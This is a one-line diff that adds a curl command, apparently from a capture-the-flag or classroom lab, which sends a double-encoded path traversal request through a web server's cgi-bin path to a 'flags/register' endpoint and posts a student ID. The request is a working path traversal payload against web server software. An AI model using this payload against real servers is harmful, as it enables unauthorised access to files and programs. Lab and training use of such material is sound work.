@@ -1,0 +1,1 @@
+curl 'http://<ip>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flags/register' --data '<student_id>'
